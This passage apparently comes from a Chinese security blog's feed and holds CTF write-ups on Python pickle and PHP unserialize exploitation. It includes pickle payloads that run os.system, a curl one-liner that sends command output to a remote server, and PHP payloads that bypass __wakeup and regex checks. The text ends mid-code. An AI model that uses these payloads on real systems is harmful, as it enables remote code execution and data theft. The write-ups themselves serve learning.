os.system}</code>来<code>BUILD</code>这个对象，就会造成任意代码执行，现在对象的<code>__setstate__</code>就变成了</p><p><code>os.system</code>，接下来再次利用<code>dir</code>来<code>BUILD</code>这个对象，就构成了<code>os.system(&#39;dir&#39;)</code>命令执行，实现了RCE</p><p><code>payload</code>：<code>b&#39;\x80\x03c__main__\nFoo\n)\x81}(V__setstate__\ncos\nsystem\nubVdir\nb.&#39;</code></p><p>有如下代码：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> pickletools<span class="token keyword">class</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     self<span class="token punctuation">.</span>val <span class="token operator">=</span> <span class="token number">2020</span>  <span class="token keyword">def</span> <span class="token function">__getstate__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm being pickled"</span><span class="token punctuation">)</span>     self<span class="token punctuation">.</span>val <span class="token operator">*=</span> <span class="token number">2</span>     <span class="token keyword">return</span> self<span class="token punctuation">.</span>__dict__f <span class="token operator">=</span> Foo<span class="token punctuation">(</span><span class="token punctuation">)</span>f_string <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>a <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>a<span class="token punctuation">)</span>f_new <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>f_new<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span>d <span class="token operator">=</span> b<span class="token string">'\x80\x03c__main__\nFoo\n)\x81}(V__setstate__\ncos\nsystem\nubVdir\nb.'</span>c <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>d<span class="token punctuation">)</span>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>c<span class="token punctuation">)</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>c<span class="token punctuation">)</span></code></pre><p>执行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200407100434411.png" alt="" loading="lazy"></p><p>可见成功执行了命令</p><p>完整payload如下：</p><pre class=" language-python"><code class="language-python">b<span class="token string">'\x80\x03c__main__\nFoo\n)\x81}(V__setstate__\ncos\nsystem\nubVdir\nb0c__main__\nFoo\nq\x00)\x81q\x01}q\x02X\x03\x00\x00\x00valq\x03K\x04sb.'</span></code></pre><p>恶意代码执行完后将栈弹空，然后压一个正常的<code>student</code>入栈</p><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>其他模块的load也可以触发pickle反序列化漏洞。例如：<code>numpy.load()</code>先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此<code>numpy.load()</code>也可以触发pickle反序列化漏洞。</p><p>即使代码中没有<code>import os</code>，GLOBAL指令也可以自动导入<code>os.system</code>。因此，不能认为“我不在代码里面导入os库，pickle反序列化的时候就不能执行os.system”。</p><p>即使没有回显，也可以很方便地调试恶意代码。只需要拥有一台公网服务器，执行</p><pre><code>os.system(&#39;curl your_server/`ls / | base64`&#39;)</code></pre><p>然后查询您自己的服务器日志，就能看到结果。这是因为：以反引号包含的代码，在sh中会直接执行，返回其结果。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89132768</a></li><li><a href="https://mp.weixin.qq.com/s/3CLh1V9FZ36-Tw9ikUSsaA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3CLh1V9FZ36-Tw9ikUSsaA</a></li><li><a href="https://www.cnblogs.com/cioi/p/12464592.html" target="_blank" rel="noopener">https://www.cnblogs.com/cioi/p/12464592.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;pickle库&quot;&gt;&lt;a href=&quot;#pickle库&quot; class=&quot;headerlink&quot; title=&quot;pickle库&quot;&gt;&lt;/a&gt;pickle库&lt;/h3&gt;&lt;p&gt;说到python反序列化就当然离不开&lt;code&gt;pickle&lt;/code&gt;库&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405204254190.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;以上例子简单的示范了python进行序列化和反序列化的操作&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="反序列化" scheme="https://www.extrader.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="python" scheme="https://www.extrader.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>反序列化</title>
    <link href="https://www.extrader.top/2020/04/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://www.extrader.top/2020/04/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-04-01T16:00:00.000Z</published>
    <updated>2020-07-14T10:39:36.061Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>php中常用的几种魔术方法和触发条件</p><pre class=" language-php"><code class="language-php">__construct ：当一个对象创建时被调用__destruct ：当一个对象销毁时被调用__toString ：当一个类或对象被当作一个字符串被调用__wakeup ：当一个对象使用 unserialize 时触发，反序列化时触发__sleep ：当一个对象使用 serialize 时触发，序列化时触发__get ：当一个对象读取不可访问属性的值时触发__set ：当一个对象在给不可访问属性赋值时__isset ：当一个对象当对不可访问属性调用 isset 或 empty 时触发__unset ：当一个对象对不可访问属性调用 unset 时触发__invoke ：当一个对象尝试以调用函数的方式调用一个对象时触发__set_state ：当一个对象调用 var_export 导出类时，此静态方法会被调用__call ：当一个对象在对象上下文中调用不可访问的方法时触发 __callStatic ：当一个对象在静态上下文中调用不可访问的方法时触发</code></pre><p>不同属性之间的区别</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span>  变量（公有） 直接将变量名反序列化出来 <span class="token keyword">protected</span>  变量（受保护） \<span class="token package">x00</span> <span class="token operator">+</span> <span class="token operator">*</span> <span class="token operator">+</span> \<span class="token package">x00</span> <span class="token operator">+</span> 变量名 <span class="token keyword">private</span>  变量（私有） \<span class="token package">x00</span> <span class="token operator">+</span> 类名 <span class="token operator">+</span> \<span class="token package">x00</span> <span class="token operator">+</span> 变量名</code></pre><a id="more"></a><hr><h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><p>感谢xctf平台，题目<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1" target="_blank" rel="noopener">链接</a></p><p>题目代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">{</span>     <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'index.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">//the secret is in the fl4g.php</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">'index.php'</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre><p>由代码可知，题目提供了一个<code>var</code>参数给我们进行<code>get</code>传参，首先先对<code>var</code>进行<code>base64</code>解码，然后进入<code>if</code>判断语句，若判断条件不成立就进入<code>else</code>，进行<code>unserialize</code>操作，题目提供了一个<code>Demo</code>类来进行序列化操作，且其中的<code>__destruct</code>方法可以将代码显示出来，题目提示了<code>the secret is in the fl4g.php</code>，flag应该就在<code>fl4g.php</code>中，于是寻找突破点</p><p>题目限制条件：</p><blockquote><p>preg_match(‘/[oc]:\d+:/i’, $var)：对传入的var经过base64解密后的字符串进正则匹配，来防止反序列化操作</p><p><code>__wakeup</code>函数：<code>__wakeup()</code>是用在反序列化操作中。<code>unserialize()</code>会检查存在一个<code>__wakeup()</code>方法。如果存在，则先会调用<code>__wakeup()</code>方法，在这里这个函数会将<code>file</code>赋值为<code>index.php</code></p></blockquote><p>可是这两种方法都可以进行绕过：</p><blockquote><p>preg_match()：这个正则匹配函数是用来防止反序列化的开头的，如<code>O:4:</code>即可匹配上，但可以用+进行绕过，可以写成<code>O:+4:</code>反序列化函数一样识别</p><p><code>__wakeup</code>函数：<code>__wakeup()</code>漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup</code>的执行。例如<code>O:4:&quot;Demo&quot;:1:</code>，Demo后面的1表示的就是类的属性个数，将1改大即可跳过<code>__wakeup</code>函数的执行</p></blockquote><p>于是构造payload：<code>O:+4:&quot;Demo&quot;:4:{s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;}</code></p><p>注意<code>file</code>前面的<code>Demo</code>左右需要有<code>%00</code></p><pre class=" language-php"><code class="language-php">序列化后：v1 表示 <span class="token keyword">public</span>   <span class="token operator">%</span>00Demo<span class="token operator">%</span>00v2 表示 <span class="token keyword">private</span><span class="token punctuation">(</span>Demo为类名<span class="token punctuation">)</span>   <span class="token operator">%</span><span class="token number">00</span><span class="token operator">*</span><span class="token operator">%</span>00v3 表示 <span class="token keyword">protected</span>  v1<span class="token punctuation">,</span>v2<span class="token punctuation">,</span>v3为属性名</code></pre><p><code>base64</code>编码后<code>TzorNDoiRGVtbyI6NDp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><blockquote><p>参考：<br><a href="https://www.jianshu.com/p/8f498198fc3d" target="_blank" rel="noopener">php序列化与反序列化入门</a><br><a href="https://www.cnblogs.com/kacha886/p/9115503.html" target="_blank" rel="noopener">魔术方法<code>__sleep()</code>,<code>__wakeup()</code></a><br><a href="http://blog.sina.com.cn/s/blog_15ebf299a0102xnug.html" target="_blank" rel="noopener">__wakeup()函数漏洞以及实际漏洞分析</a></p></blockquote><p>PS：php代码审计是个大坑，刚接触的话上手还是有点困难，还是要多看看php代码，需要有面向对象编程的思想，否则代码量大的就比较难入手；序列化算是一个重点了吧，原来就接触过好多这样的题，但都不怎么看得懂，所以就都略过了，现在学了点php基础勉强能够看的懂，总之多看多思考，慢慢来吧。</p><hr><h3 id="极客大挑战-2019—PHP"><a href="#极客大挑战-2019—PHP" class="headerlink" title="极客大挑战-2019—PHP"></a>极客大挑战-2019—PHP</h3><p>界面：<br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200324104326758.png" alt="" loading="lazy"></p><p>题目提示网站有备份，于是访问<code>www.zip</code>，得到网页源码：</p><p>index.php</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  ......<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">    <span class="token number">......</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>world<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-shadow</span><span class="token punctuation">:</span><span class="token number">0</span>px <span class="token number">0</span>px <span class="token number">5</span>px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">20</span>px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> <span class="token number">85%</span><span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">440</span>px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-shadow</span><span class="token punctuation">:</span><span class="token number">0</span>px <span class="token number">0</span>px <span class="token number">5</span>px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">20</span>px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> <span class="token number">80%</span><span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">700</span>px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>不愧是我！！！    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-shadow</span><span class="token punctuation">:</span><span class="token number">0</span>px <span class="token number">0</span>px <span class="token number">5</span>px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">20</span>px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> <span class="token number">70%</span><span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">640</span>px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token prolog">&lt;?php    include 'class.php';    $select = $_GET['select'];    $res=unserialize(@$select);    ?></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> <span class="token number">5%</span><span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">99%</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font</span><span class="token punctuation">:</span>italic <span class="token number">15</span>px Georgia,serif<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>white<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> Syclover @ cl4y<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span>  <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>class.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>注意到index.php中有对get的select参数进行反序列化操作，并且题目给了一个class.php中的Name类，于是构造反序列化条件：</p><p>观察chass.php代码发现只要令password=100，username=admin，且绕过__wakeup函数即可，于是得到payload：</p><pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"%00Name%00password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"100"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>传入即可</p><hr><h3 id="MRCTF—Ezpop"><a href="#MRCTF—Ezpop" class="headerlink" title="MRCTF—Ezpop"></a>MRCTF—Ezpop</h3><p>题目源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//flag is in flag.php</span><span class="token comment" spellcheck="true">//WTF IS THIS?</span><span class="token comment" spellcheck="true">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="token comment" spellcheck="true">//And Crack It!</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> 